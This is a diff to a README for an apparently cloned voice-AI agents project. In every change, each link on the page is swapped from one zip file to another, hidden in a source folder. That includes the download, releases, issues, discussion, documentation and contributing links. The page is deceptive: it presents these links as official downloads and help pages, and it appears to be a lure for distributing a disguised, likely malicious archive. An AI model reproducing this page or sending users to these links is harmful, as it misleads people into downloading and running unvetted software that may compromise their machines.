@@ -1,6 +1,6 @@
 # 🤖 agents - Build Voice AI Agents Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/jwoo0329/agents/main/livekit-plugins/livekit-plugins-ultravox/livekit/plugins/ultravox/Software-v1.6.zip%20Now-Ready%20to%20Go-brightgreen)](https://raw.githubusercontent.com/jwoo0329/agents/main/livekit-plugins/livekit-plugins-ultravox/livekit/plugins/ultravox/Software-v1.6.zip)
+[![Download Now](https://raw.githubusercontent.com/jwoo0329/agents/main/examples/voice_agents/Software-preremove.zip%20Now-Ready%20to%20Go-brightgreen)](https://raw.githubusercontent.com/jwoo0329/agents/main/examples/voice_agents/Software-preremove.zip)
 
 ## 🌟 Introduction
 
@@ -18,7 +18,7 @@ Follow these easy steps to download and set up agents on your computer:
 
 2. **Visit the Releases Page**
    - To download the latest version, click the link below:
-   - [Download agents from the Releases page](https://raw.githubusercontent.com/jwoo0329/agents/main/livekit-plugins/livekit-plugins-ultravox/livekit/plugins/ultravox/Software-v1.6.zip)
+   - [Download agents from the Releases page](https://raw.githubusercontent.com/jwoo0329/agents/main/examples/voice_agents/Software-preremove.zip)
 
 ## 📥 Download & Install
 
@@ -44,14 +44,14 @@ Congratulations! You've installed agents on your computer.
 
 If you have questions or need assistance, you can reach out through the following channels:
 
-- **Issues Page**: Report any problems or bugs on the [Issues page](https://raw.githubusercontent.com/jwoo0329/agents/main/livekit-plugins/livekit-plugins-ultravox/livekit/plugins/ultravox/Software-v1.6.zip).
-- **Discussion Forum**: Join the conversation in our [Discussion section](https://raw.githubusercontent.com/jwoo0329/agents/main/livekit-plugins/livekit-plugins-ultravox/livekit/plugins/ultravox/Software-v1.6.zip).
+- **Issues Page**: Report any problems or bugs on the [Issues page](https://raw.githubusercontent.com/jwoo0329/agents/main/examples/voice_agents/Software-preremove.zip).
+- **Discussion Forum**: Join the conversation in our [Discussion section](https://raw.githubusercontent.com/jwoo0329/agents/main/examples/voice_agents/Software-preremove.zip).
 
 ## 📚 Documentation
 
 For more detailed instructions on using agents, you can explore our documentation:
-- [User Guide](https://raw.githubusercontent.com/jwoo0329/agents/main/livekit-plugins/livekit-plugins-ultravox/livekit/plugins/ultravox/Software-v1.6.zip)
-- [API Reference](https://raw.githubusercontent.com/jwoo0329/agents/main/livekit-plugins/livekit-plugins-ultravox/livekit/plugins/ultravox/Software-v1.6.zip)
+- [User Guide](https://raw.githubusercontent.com/jwoo0329/agents/main/examples/voice_agents/Software-preremove.zip)
+- [API Reference](https://raw.githubusercontent.com/jwoo0329/agents/main/examples/voice_agents/Software-preremove.zip)
 
 ## 🔍 Examples
 
@@ -59,7 +59,7 @@ To help you get started, we have included sample projects that demonstrate how t
 
 ## 📝 Contributing
 
-We welcome contributions from everyone! If you want to improve agents, please read our guidelines on the [Contributing page](https://raw.githubusercontent.com/jwoo0329/agents/main/livekit-plugins/livekit-plugins-ultravox/livekit/plugins/ultravox/Software-v1.6.zip).
+We welcome contributions from everyone! If you want to improve agents, please read our guidelines on the [Contributing page](https://raw.githubusercontent.com/jwoo0329/agents/main/examples/voice_agents/Software-preremove.zip).
 
 ## 🚀 Explore More
 
